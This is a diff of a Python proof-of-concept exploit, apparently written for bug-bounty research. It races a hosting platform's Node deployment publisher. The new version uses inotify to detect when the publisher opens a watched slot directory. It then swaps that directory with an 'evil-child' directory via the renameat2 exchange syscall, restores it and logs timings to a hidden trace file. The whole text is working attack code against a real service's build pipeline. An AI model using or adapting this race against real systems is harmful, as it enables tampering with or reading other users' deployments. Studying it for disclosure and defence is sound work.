@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Race nested directories after the publisher enters its copy phase."""
+"""Swap a watched child directory as the publisher opens it."""
 
 from __future__ import annotations
 
@@ -13,35 +13,22 @@ import time
 SYS_RENAMEAT2 = 316
 AT_FDCWD = -100
 RENAME_EXCHANGE = 2
-MARKER = b"HOSTINGER_NODE_NESTED_LOG_WATCH_TOCTOU_GATE:r226"
+IN_ACCESS = 0x00000001
+IN_OPEN = 0x00000020
+MARKER = b"HOSTINGER_NODE_INOTIFY_CHILD_TOCTOU_GATE:r227"
 PUBLISHING = b"==> Publishing"
-SLOT_COUNT = 64
 libc = ctypes.CDLL(None, use_errno=True)
+first = os.fsencode("dist/slot-00")
+second = os.fsencode("evil-child")
 started = time.monotonic()
 deadline = started + 30.0
 logs_root = Path.cwd().parents[1] / "logs"
-pairs = [
-    (
-        os.fsencode(f"dist/slot-{index:02d}"),
-        os.fsencode(f"race-alternates/alt-{index:02d}"),
-    )
-    for index in range(SLOT_COUNT)
-]
-trace = {
-    "marker": MARKER.decode(),
-    "event": "not-observed",
-    "logsRootAccessible": logs_root.is_dir(),
-    "slotCount": SLOT_COUNT,
-}
+trace = {"marker": MARKER.decode(), "event": "not-observed", "logsRootAccessible": logs_root.is_dir()}
 
 
 def current_log() -> Path | None:
     try:
-        candidates = sorted(
-            logs_root.glob("*/*_deploy.log"),
-            key=lambda item: item.stat().st_mtime_ns,
-            reverse=True,
-        )[:8]
+        candidates = sorted(logs_root.glob("*/*_deploy.log"), key=lambda item: item.stat().st_mtime_ns, reverse=True)[:8]
     except OSError:
         return None
     for candidate in candidates:
@@ -53,7 +40,7 @@ def current_log() -> Path | None:
     return None
 
 
-def exchange(first: bytes, second: bytes) -> int:
+def exchange() -> int:
     return libc.syscall(
         SYS_RENAMEAT2,
         AT_FDCWD,
@@ -64,13 +51,19 @@ def exchange(first: bytes, second: bytes) -> int:
     )
 
 
+inotify_fd = libc.inotify_init1(os.O_NONBLOCK | os.O_CLOEXEC)
+watch = -1
+if inotify_fd >= 0:
+    watch = libc.inotify_add_watch(inotify_fd, ctypes.c_char_p(first), IN_OPEN | IN_ACCESS)
+trace.update(inotifyFdOk=inotify_fd >= 0, watchOk=watch >= 0)
+
 log_path = None
 while time.monotonic() < deadline and log_path is None:
     log_path = current_log()
     if log_path is None:
         time.sleep(0.0005)
 
-if log_path is not None:
+if log_path is not None and watch >= 0:
     trace.update(event="current-log-found", logFoundAfterMs=round((time.monotonic() - started) * 1000, 3))
     while time.monotonic() < deadline:
         try:
@@ -82,38 +75,38 @@ if log_path is not None:
             time.sleep(0.00025)
             continue
         trace.update(event="publishing-observed", publishingAfterMs=round((time.monotonic() - started) * 1000, 3))
-        race_deadline = time.monotonic() + 1.5
-        loops = 0
-        exchanges = 0
-        errors = 0
-        while time.monotonic() < race_deadline:
-            for first, second in pairs:
-                if exchange(first, second) == 0:
-                    exchanges += 1
-                else:
-                    errors += 1
-            for first, second in reversed(pairs):
-                if exchange(first, second) == 0:
-                    exchanges += 1
-                else:
-                    errors += 1
-            loops += 1
-        trace.update(loops=loops, exchanges=exchanges, exchangeErrors=errors)
+        event_deadline = time.monotonic() + 2.0
+        while time.monotonic() < event_deadline:
+            try:
+                event = os.read(inotify_fd, 4096)
+            except BlockingIOError:
+                time.sleep(0.00005)
+                continue
+            except OSError:
+                event = b""
+            if not event:
+                time.sleep(0.00005)
+                continue
+            trace.update(event="slot-open-observed", slotOpenAfterMs=round((time.monotonic() - started) * 1000, 3), eventBytes=len(event))
+            result = exchange()
+            trace["exchangeErrno"] = ctypes.get_errno() if result != 0 else 0
+            if result == 0:
+                time.sleep(0.5)
+                restore = exchange()
+                trace["restoreErrno"] = ctypes.get_errno() if restore != 0 else 0
+            break
         break
 
-restored = 0
-for index, (first, second) in enumerate(pairs):
-    slot = Path(f"dist/slot-{index:02d}")
-    alternate = Path(f"race-alternates/alt-{index:02d}")
-    try:
-        if slot.is_symlink() and alternate.is_dir() and exchange(first, second) == 0:
-            restored += 1
-    except OSError:
-        continue
-trace["restoredSlots"] = restored
+try:
+    if Path("dist/slot-00").is_symlink() and Path("evil-child").is_dir():
+        exchange()
+except OSError:
+    pass
+if inotify_fd >= 0:
+    os.close(inotify_fd)
 trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
 try:
-    trace_path = Path.home() / ".h1-r226-race-trace.json"
+    trace_path = Path.home() / ".h1-r227-race-trace.json"
     trace_path.write_text(json.dumps(trace, sort_keys=True))
     trace_path.chmod(0o600)
 except OSError:
